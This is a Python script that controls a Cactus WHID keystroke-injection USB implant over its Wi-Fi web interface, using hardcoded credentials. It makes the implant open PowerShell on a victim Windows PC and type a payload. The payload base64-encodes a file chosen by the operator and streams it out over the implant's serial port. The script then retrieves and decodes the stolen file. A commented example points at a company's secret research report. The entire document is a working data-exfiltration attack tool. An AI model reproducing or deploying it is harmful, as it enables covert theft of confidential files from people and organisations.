import requests
import base64
import ntpath
import time
import sys
import os

from requests.auth import HTTPBasicAuth

creds = HTTPBasicAuth("admin", "hacktheplanet")
url = "http://192.168.1.1"
delay = 3

def usage():
    print(f"{__file__} [-r = resume running download]")
    quit()

# CHECK CMD-LINE ARGS
resume = False
if len(sys.argv) > 2:
    usage()
elif len(sys.argv) == 2:
    if sys.argv[1] != "-r":
        usage()
    else:
        resume = True

ts = time.time()

# GET OR LOAD FILENAME
if resume:
    with open(".cactus.exfil", "r") as f:
        file = f.read()
else:
    #file = "D:\Firmengeheimnisse\Geheimer_Forschungsbericht.pdf"
    file = input("FILE-PATH> ").strip()
    with open(".cactus.exfil", "w") as f:
        f.write(file)

# DELETE EXFIL-FILE TO START FRESH
if not resume:
    requests.get(f"{url}/deletepayload/yes?payload=/SerialEXFIL.txt")

# INITIALISATION AND DETECTION OF THE PORT
to_send = '$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\CIMV2" -Filter "PNPDeviceID like \'%VID_1b4f&PID_9208%\'").Caption;'
to_send += '$com=[regex]::match($s,\'COM([0-9]+)\').Value;'
to_send += '$WHIDport= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one;'
to_send += 'echo "" > $env:TEMP\\tmp; echo "" > $env:TEMP\\tmp2; '

# DOWNLOAD FILE
to_send += f'$res = [convert]::ToBase64String((Get-Content -Path "{file}" -Encoding byte)); '
# Split into 100 byte chunks
to_send += '$res -Split "(.{100})" | ?{$_} > $env:TEMP\\tmp; echo "!!!END!!!" >> $env:TEMP\\tmp; '
# Convert to UTF8
to_send += '$chunks = Get-Content $env:TEMP\\tmp; $chunks | Set-Content -Encoding "UTF8" $env:TEMP\\tmp; '
# Send code
to_send += '$WHIDport.open(); '
to_send += 'foreach($line in Get-Content $env:TEMP\\tmp){ $WHIDport.WriteLine("SerialEXFIL:$line"); Start-Sleep -Milliseconds 1500; } '
to_send += '$WHIDport.Close(); exit;'
# Send command to PC
if not resume:
    requests.post(f"{url}/runlivepayload", data={"livepayload": f'Press: 131+114\nDELAY: 1500\nPrintLine: powershell.exe', "livepayloadpresent": "1"})
    time.sleep(delay * 2)
    requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: {to_send}', "livepayloadpresent": "1"})
    time.sleep(delay)

# RECEIVE DATA
res = ""
while "!!!END!!!" not in res:
    try:
        res = requests.get(f"{url}/SerialEXFIL.txt", auth=creds).text
        print(f"Got {len(res)} bytes", end="\r", flush=True)
        time.sleep(delay + int(len(res) / 100000))
    except KeyboardInterrupt:
        quit()
    except:
        res = ""
        
# REMOVE BYTE COUNTER
print()
        
# DECODE BASE64 AND SAVE
b64 = res.replace("\r", "").replace("!!!END!!!", "").replace("\r", "").replace("\n", "").strip().encode("ascii")
byte_arr = base64.b64decode(b64)

# WRITE FILE
filename = ntpath.basename(file)
if os.path.isfile(filename):
    filename = f"{os.path.splitext(filename)[0]}_{int(time.time())}{os.path.splitext(filename)[1]}"
with open(filename, "wb") as f:
    f.write(byte_arr)

print(f"FILE {filename} ({len(byte_arr)} bytes) RECEIVED IN {time.time() - ts} SEC.")
